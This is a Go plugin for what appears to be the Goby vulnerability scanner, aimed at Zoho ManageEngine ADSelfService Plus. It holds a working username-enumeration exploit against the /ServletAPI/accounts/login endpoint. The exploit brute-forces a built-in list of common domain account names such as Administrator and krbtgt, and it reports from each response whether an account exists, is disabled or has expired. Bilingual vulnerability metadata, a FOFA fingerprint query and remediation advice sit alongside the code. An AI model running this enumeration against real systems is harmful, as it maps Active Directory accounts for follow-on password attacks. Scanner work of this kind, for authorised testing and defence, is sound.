package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Zoho ManageEngine ADSelfService Plus login Api Username Enumeration Vulnerability",
    "Description": "<p>Zoho ManageEngine ADSelfService Plus is an integrated self-service password management and single sign-on solution system for Active Directory and cloud applications.</p><p>There is a username enumeration vulnerability in Zoho ManageEngine ADSelfService Plus system/ServletAPI/accounts/login interface. Attackers can enumerate domain users registered to AdSelfService through brute force.</p>",
    "Impact": "<p>Zoho ManageEngine ADSelfService Plus Username Enumeration</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.manageengine.com/products/self-service-password/\">https://www.manageengine.com/products/self-service-password/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Zoho ManageEngine ADSelfService Plus",
    "VulType": [
        "Other"
    ],
    "Tags": [
        "Other"
    ],
    "Translation": {
        "CN": {
            "Name": "Zoho ManageEngine ADSelfService Plus 系统 login 接口用户名枚举漏洞",
            "Product": "Zoho ManageEngine ADSelfService Plus",
            "Description": "<p>Zoho ManageEngine ADSelfService Plus 是针对 Active Directory 和云应用程序的集成式自助密码管理和单点登录解决方案系统。</p><p>Zoho ManageEngine ADSelfService Plus 系统/ServletAPI/accounts/login接口存在用户名枚举漏洞，攻击者可通过暴力破解的方式来枚举已注册到 AdSelfService 的域用户。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.manageengine.com/products/self-service-password/\">https://www.manageengine.com/products/self-service-password/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Zoho ManageEngine ADSelfService Plus 系统/ServletAPI/accounts/login接口存在用户名枚举漏洞，攻击者可通过暴力破解的方式来枚举已注册到 AdSelfService 的域用户。</p>",
            "VulType": [
                "其它"
            ],
            "Tags": [
                "其它"
            ]
        },
        "EN": {
            "Name": "Zoho ManageEngine ADSelfService Plus login Api Username Enumeration Vulnerability",
            "Product": "Zoho ManageEngine ADSelfService Plus",
            "Description": "<p>Zoho ManageEngine ADSelfService Plus is an integrated self-service password management and single sign-on solution system for Active Directory and cloud applications.</p><p>There is a username enumeration vulnerability in Zoho ManageEngine ADSelfService Plus system/ServletAPI/accounts/login interface. Attackers can enumerate domain users registered to AdSelfService through brute force.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.manageengine.com/products/self-service-password/\">https://www.manageengine.com/products/self-service-password/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Zoho ManageEngine ADSelfService Plus Username Enumeration</p>",
            "VulType": [
                "Other"
            ],
            "Tags": [
                "Other"
            ]
        }
    },
    "FofaQuery": "banner=\"Set-Cookie: _zcsr_tmp=\" || header=\"Set-Cookie: _zcsr_tmp=\"",
    "GobyQuery": "banner=\"Set-Cookie: _zcsr_tmp=\" || header=\"Set-Cookie: _zcsr_tmp=\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.manageengine.com/products/self-service-password/",
    "DisclosureDate": "2022-04-21",
    "References": [
        "https://github.com/passtheticket/vulnerability-research/blob/main/manage-engine-apps/adselfservice-userenum.md"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "0",
    "CVSS": "4.3",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "Brute force,cmd",
            "show": ""
        },
        {
            "name": "Username",
            "type": "input",
            "value": "Administrator",
            "show": "AttackType=cmd"
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10359"
}`

	Zoho_AD_Usersjdjak := func(hostinfo *httpclient.FixUrl) string {
		username := [509]string{"Administrator", "krbtgt", "Guest", "admin", "admin123", "test", "webadmin", "sysadmin", "netadmin", "mailadmin", "sqladmin", "vpn", "web", "sysuser", "security", "dbuser", "support", "public", "root", "system"}
		usernameFind := ""
		for i := 0; i < 20; i++ {
			uri1 := "/ServletAPI/accounts/login"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg1.Data = `loginName=` + username[i]
			if resp1, err := httpclient.DoHttpRequest(hostinfo, cfg1); err == nil && resp1.StatusCode == 200 {
				if strings.Contains(resp1.RawBody, "WELCOME_NAME") && strings.Contains(resp1.RawBody, "LOGIN_STATUS") {
					usernameFind += username[i] + " 用户存在\n"
				} else if strings.Contains(resp1.RawBody, "eSTATUS\":\"Your account has been disabled") {
					usernameFind += username[i] + " 用户被禁用\n"
				}
			}
		}
		return usernameFind
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/ServletAPI/accounts/login"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg1.Data = `loginName=test1jjjjjsdak`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "eSTATUS\":\"Permission Denied")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "Brute force" {
				BruteResult := Zoho_AD_Usersjdjak(expResult.HostInfo)
				expResult.Output = BruteResult + "遍历top20完毕"
				expResult.Success = true
			}
			if ss.Params["AttackType"].(string) == "cmd" {
				cmd := ss.Params["Username"].(string)
				uri1 := "/ServletAPI/accounts/login"
				cfg1 := httpclient.NewPostRequestConfig(uri1)
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
				cfg1.Data = `loginName=` + cmd
				if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 {
					if strings.Contains(resp1.RawBody, "WELCOME_NAME") && strings.Contains(resp1.RawBody, "LOGIN_STATUS") {
						expResult.Output = cmd + " 用户存在\n"
					} else if strings.Contains(resp1.RawBody, "eSTATUS\":\"Your account has been disabled") {
						expResult.Output = cmd + " 用户被禁用\n"
					} else if strings.Contains(resp1.RawBody, "eSTATUS\":\"Permission Denied. Kindly contact your Administrator.") {
						expResult.Output = cmd + " 用户不存在\n"
					} else if strings.Contains(resp1.RawBody, "eSTATUS\":\"Your account has expired. Please see your system administrator.") {
						expResult.Output = cmd + " 用户已过期\n"
					}
					expResult.Output += resp1.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
